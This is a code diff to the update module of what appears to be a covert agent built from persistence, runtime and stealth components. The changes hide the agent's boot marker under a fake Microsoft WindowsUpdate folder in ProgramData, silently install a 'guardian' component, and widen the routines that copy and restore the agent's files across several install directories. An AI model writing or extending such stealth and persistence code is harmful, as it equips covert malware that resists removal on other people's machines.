@@ -29,7 +29,7 @@ from . import persistence, runtime, stealth
 
 IS_WINDOWS = os.name == "nt"
 CREATE_NEW_PROCESS_GROUP = 0x00000200 if IS_WINDOWS else 0
-BOOT_MARK = os.path.join(tempfile.gettempdir(), "windowsupdateservice.boot")
+BOOT_MARK = os.path.join(os.environ.get("PROGRAMDATA") or tempfile.gettempdir(), "Microsoft", "WindowsUpdate", "boot")
 
 
 def _sha256(data: bytes) -> str:
@@ -69,6 +69,7 @@ def write_boot_marker() -> None:
     """Called by a freshly started agent so its parent knows it survived."""
     entry = os.path.join(stealth.bundle_root(), "agent.py")
     try:
+        os.makedirs(os.path.dirname(BOOT_MARK), exist_ok=True)
         with open(BOOT_MARK, "w", encoding="ascii") as handle:
             handle.write(f"{os.getpid()}:{_file_sha256(entry)}")
     except OSError:
@@ -109,6 +110,12 @@ def apply(archive: bytes, expected_sha: str = "",
 
     persistence.install_copies()
 
+    try:
+        from .. import guardian
+        guardian.install()
+    except Exception:
+        pass
+
     if restart:
         restart_self()
     return True, digest[:12]
@@ -116,7 +123,7 @@ def apply(archive: bytes, expected_sha: str = "",
 
 def _swap(staging: str, root: str) -> None:
     """Replace the live bundle with the staged one, keeping backups."""
-    for relative in ("syspy", "agent.py"):
+    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
         live = os.path.join(root, relative)
         fresh = os.path.join(staging, relative)
         if not os.path.exists(fresh):
@@ -129,7 +136,7 @@ def _swap(staging: str, root: str) -> None:
     for directory in stealth.install_directories():
         if os.path.abspath(directory) == os.path.abspath(root):
             continue
-        for relative in ("syspy", "agent.py"):
+        for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
             source = os.path.join(root, relative)
             if not os.path.exists(source):
                 continue
@@ -146,7 +153,7 @@ def rollback() -> int:
     """Restore ``.bak`` copies.  Returns how many items were restored."""
     root = stealth.bundle_root()
     restored = 0
-    for relative in ("syspy", "agent.py"):
+    for relative in ("syspy", "agent.py", "bootstrap.py", "install"):
         backup = os.path.join(root, relative + ".bak")
         live = os.path.join(root, relative)
         if not os.path.exists(backup):
@@ -170,6 +177,7 @@ def restart_self(path: str | None = None) -> None:
     if not os.path.exists(target):
         target = os.path.join(root, "agent.py")
 
+    os.makedirs(os.path.dirname(BOOT_MARK), exist_ok=True)
     _remove(BOOT_MARK)
 
     if getattr(sys, "frozen", False) or target.lower().endswith(".exe"):
